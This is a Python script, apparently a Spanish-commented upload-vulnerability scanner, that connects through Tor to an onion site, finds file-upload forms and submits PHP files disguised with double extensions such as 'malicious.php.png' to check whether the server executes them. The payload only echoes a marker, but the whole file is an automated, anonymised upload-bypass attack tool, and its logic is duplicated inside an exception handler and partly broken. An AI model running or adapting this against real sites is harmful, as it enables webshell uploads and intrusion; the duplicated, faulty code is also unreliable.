import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import threading
import json
import os

class FileUploadValidator:
    def __init__(self, onion_urls, tor_proxy="socks5h://127.0.0.1:9050"):
        self.onion_urls = onion_urls
        self.tor_proxy = tor_proxy
        self.session = requests.Session()
        self.session.proxies = {
            'http': self.tor_proxy,
            'https': self.tor_proxy
        }
        self.results = {}

    def get_file_upload_form(self, onion_url):
        try:
            response = self.session.get(onion_url)
            response.raise_for_status()
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                input_type = form.find('input', {'type': 'file'})
                if input_type:
                    input_name = input_type.get('name', 'file')
                    allowed_file_types = input_type.get('accept', '').split(',')

                    # Buscar el campo select para el tipo de archivo permitido
                    select_field = form.find('select', {'name': 'fileType'})
                    if select_field:
                        selected_option = select_field.find('option', {'selected': True})
                        if selected_option:
                            selected_mime_type = selected_option.get('value', '')
                            if selected_mime_type:
                                allowed_file_types.append(selected_mime_type)

                    yield (form, input_name, allowed_file_types)
        except requests.exceptions.RequestException as e:
            print(f"Error al acceder a {onion_url}: {e}")

    def test_file_upload(self, onion_url, form, input_name, allowed_file_types):
        try:
            action = form.get('action')
            if not action:
                print(f"No se encontró ninguna acción en el formulario de {onion_url}")
                return

            # Lista de archivos maliciosos para probar
            malicious_files = [
                ("malicious.php.png", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.txt", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.jpg", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.jpeg", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.gif", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.bmp", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.zip", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.tar.gz", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.rar", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.pdf", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.docx", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.xlsx", "<?php echo 'VULNERABLE'; ?>"),
                ("malicious.php.pptx", "<?php echo 'VULNERABLE'; ?>")
            ]

            # Realizar la solicitud POST con un archivo válido para obtener los tipos MIME permitidos
            files = {input_name: ('test_file.txt', b'test content')}
            res = self.session.post(urljoin(onion_url, action), files=files,
                                    proxies=self.session.proxies, allow_redirects=True)

            # Obtener la extensión del archivo subido
            uploaded_extension = os.path.splitext('test_file.txt')[1]

            # Agregar la extensión del archivo subido a la lista de tipos MIME permitidos
            allowed_file_types.append(uploaded_extension)

            # Almacenar el resultado en el diccionario de resultados
            self.results[onion_url] = {
                "allowed_file_types_from_form": allowed_file_types
            }

            # Probar la carga de archivos maliciosos
            for file_name, content in malicious_files:
                # Crear el archivo malicioso
                with open(file_name, "w") as malicious_file:
                    malicious_file.write(content)

                # Cargar el archivo malicioso
                files = {input_name: open(file_name, 'rb')}
                res = self.session.post(urljoin(onion_url, action), files=files,
                                        proxies=self.session.proxies, allow_redirects=True)

                # Eliminar el archivo malicioso después de la prueba
                os.remove(file_name)

                # Verificar si el código malicioso se ejecutó en el servidor
                if 'VULNERABLE' in res.text:
                    if onion_url not in self.results:
                        self.results[onion_url] = {}
                    if input_name not in self.results[onion_url]:
                        self.results[onion_url][input_name] = []
                    self.results[onion_url][input_name].append(f"VULNERABLE: {file_name}")

        except requests.exceptions.RequestException as e:
            print(f"Error durante la prueba para el formulario en {onion_url}: {e}")

            try:
                action = form.get('action')
                if not action:
                    print(f"No se encontró ninguna acción en el formulario de {onion_url}")
                    return

                # Lista de archivos maliciosos para probar
                malicious_files = [
                    ("malicious.php.png", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.txt", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.jpg", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.jpeg", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.gif", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.bmp", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.zip", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.tar.gz", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.rar", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.pdf", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.docx", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.xlsx", "<?php echo 'VULNERABLE'; ?>"),
                    ("malicious.php.pptx", "<?php echo 'VULNERABLE'; ?>")
                ]

                # Realizar la solicitud POST con diferentes extensiones de archivo válido para obtener los tipos MIME permitidos
                for extension in allowed_file_types:
                    file_name = f"test_file{extension}"
                    files = {input_name: (file_name, b'test content')}
                    res = self.session.post(urljoin(onion_url, action), files=files,
                                            proxies=self.session.proxies, allow_redirects=True)

                    # Verificar si el archivo se ha subido correctamente
                    if res.status_code == 200:
                        # Obtener la extensión del archivo subido
                        uploaded_extension = os.path.splitext(file_name)[1]

                        # Agregar la extensión del archivo subido a la lista de tipos MIME permitidos
                        allowed_file_types.append(uploaded_extension)

                # Eliminar duplicados en la lista de tipos MIME permitidos
                allowed_file_types = list(set(allowed_file_types))

                # Almacenar el resultado en el diccionario de resultados
                self.results[onion_url] = {
                    "allowed_file_types_from_form": allowed_file_types
                }

                # Probar la carga de archivos maliciosos
                for file_name, content in malicious_files:
                    # Crear el archivo malicioso
                    with open(file_name, "w") as malicious_file:
                        malicious_file.write(content)

                    # Cargar el archivo malicioso
                    files = {input_name: open(file_name, 'rb')}
                    res = self.session.post(urljoin(onion_url, action), files=files,
                                            proxies=self.session.proxies, allow_redirects=True)

                    # Eliminar el archivo malicioso después de la prueba
                    os.remove(file_name)

                    # Verificar si el código malicioso se ejecutó en el servidor
                    if 'VULNERABLE' in res.text:
                        if onion_url not in self.results:
                            self.results[onion_url] = {}
                        if input_name not in self.results[onion_url]:
                            self.results[onion_url][input_name] = []
                        self.results[onion_url][input_name].append(f"VULNERABLE: {file_name}")

            except requests.exceptions.RequestException as e:
                print(f"Error durante la prueba para el formulario en {onion_url}: {e}")

    def run_tests(self):
        threads = []
        for onion_url in self.onion_urls:
            for form, input_name, allowed_file_types in self.get_file_upload_form(onion_url):
                thread = threading.Thread(target=self.test_file_upload, args=(onion_url, form, input_name, allowed_file_types))
                threads.append(thread)
                thread.start()

        for thread in threads:
            thread.join()

if __name__ == "__main__":
    onion_urls = [
        "http://kz62gxxle6gswe5t6iv6wjmt4dxi2l57zys73igvltcenhq7k3sa2mad.onion/tests/prueba_file/index.html"
    ]
    validator = FileUploadValidator(onion_urls, tor_proxy="socks5h://127.0.0.1:9050")
    validator.run_tests()
    print(json.dumps(validator.results, indent=4))
